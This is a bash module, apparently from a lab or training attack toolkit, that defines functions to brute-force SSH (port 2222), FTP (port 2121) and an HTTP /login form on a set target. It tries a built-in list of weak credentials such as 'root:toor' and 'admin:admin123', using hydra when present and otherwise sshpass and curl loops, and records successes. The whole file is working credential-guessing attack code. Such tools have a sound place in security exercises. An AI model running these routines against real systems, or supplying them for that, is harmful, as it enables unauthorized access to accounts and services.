#!/usr/bin/env bash
# Weak-credential brute force against SSH/FTP/HTTP-basic. Uses hydra if
# available, else a hand-rolled loop over a small built-in credential list
# matching the exact dummy credentials Phase 1 seeded.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

BNB_BRUTEFORCE_CREDS=(
    "admin:admin123"
    "admin:admin"
    "root:toor"
    "admin:password"
)

bruteforce_ssh() {
    target_ensure_set || { echo "[bruteforce-ssh] No target set."; return 1; }
    echo "=== SSH brute force against ${TARGET_IP}:2222 ==="
    local found="" cred user pass
    if command -v hydra >/dev/null 2>&1; then
        local userlist passlist
        userlist="$(mktemp)"; passlist="$(mktemp)"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f1 | sort -u > "$userlist"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f2 | sort -u > "$passlist"
        hydra -L "$userlist" -P "$passlist" -s 2222 "${TARGET_IP}" ssh
        if [ $? -eq 0 ]; then
            found="hydra-detected"
        fi
        rm -f "$userlist" "$passlist"
    else
        echo "(hydra not found, using fallback credential loop)"
        if ! command -v sshpass >/dev/null 2>&1; then
            echo "(sshpass also not found - cannot attempt SSH login without it)"
            results_record "bruteforce_ssh" "FAILED" "loud" "no hydra/sshpass available"
            return 1
        fi
        for cred in "${BNB_BRUTEFORCE_CREDS[@]}"; do
            user="${cred%%:*}"; pass="${cred##*:}"
            if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p 2222 "${user}@${TARGET_IP}" true 2>/dev/null; then
                echo "[SUCCESS] ${user}:${pass}"
                found="${user}:${pass}"
                break
            else
                echo "[FAILED] ${user}:${pass}"
            fi
        done
    fi
    if [ -n "$found" ]; then
        results_record "bruteforce_ssh" "SUCCESS" "loud" "credentials found: ${found}"
    else
        results_record "bruteforce_ssh" "FAILED" "loud" "no working credentials found"
    fi
}

bruteforce_ftp() {
    target_ensure_set || { echo "[bruteforce-ftp] No target set."; return 1; }
    echo "=== FTP brute force against ${TARGET_IP}:2121 ==="
    local found="" cred user pass
    if command -v hydra >/dev/null 2>&1; then
        local userlist passlist
        userlist="$(mktemp)"; passlist="$(mktemp)"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f1 | sort -u > "$userlist"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f2 | sort -u > "$passlist"
        hydra -L "$userlist" -P "$passlist" -s 2121 "${TARGET_IP}" ftp
        if [ $? -eq 0 ]; then
            found="hydra-detected"
        fi
        rm -f "$userlist" "$passlist"
    else
        echo "(hydra not found, using fallback credential loop)"
        for cred in "${BNB_BRUTEFORCE_CREDS[@]}"; do
            user="${cred%%:*}"; pass="${cred##*:}"
            if curl -s --connect-timeout 3 "ftp://${user}:${pass}@${TARGET_IP}:2121/" -o /dev/null; then
                echo "[SUCCESS] ${user}:${pass}"
                found="${user}:${pass}"
                break
            else
                echo "[FAILED] ${user}:${pass}"
            fi
        done
    fi
    if [ -n "$found" ]; then
        results_record "bruteforce_ftp" "SUCCESS" "loud" "credentials found: ${found}"
    else
        results_record "bruteforce_ftp" "FAILED" "loud" "no working credentials found"
    fi
}

bruteforce_http() {
    target_ensure_set || { echo "[bruteforce-http] No target set."; return 1; }
    echo "=== HTTP login brute force against ${TARGET_IP}:${TARGET_PORT}/login ==="
    local found="" cred user pass code
    for cred in "${BNB_BRUTEFORCE_CREDS[@]}"; do
        user="${cred%%:*}"; pass="${cred##*:}"
        code="$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://${TARGET_IP}:${TARGET_PORT}/login" -d "username=${user}&password=${pass}")"
        if [ "$code" = "200" ]; then
            echo "[SUCCESS] ${user}:${pass}"
            found="${user}:${pass}"
            break
        else
            echo "[FAILED] ${user}:${pass} (HTTP ${code})"
        fi
    done
    if [ -n "$found" ]; then
        results_record "bruteforce_http" "SUCCESS" "loud" "credentials found: ${found}"
    else
        results_record "bruteforce_http" "FAILED" "loud" "no working credentials found"
    fi
}
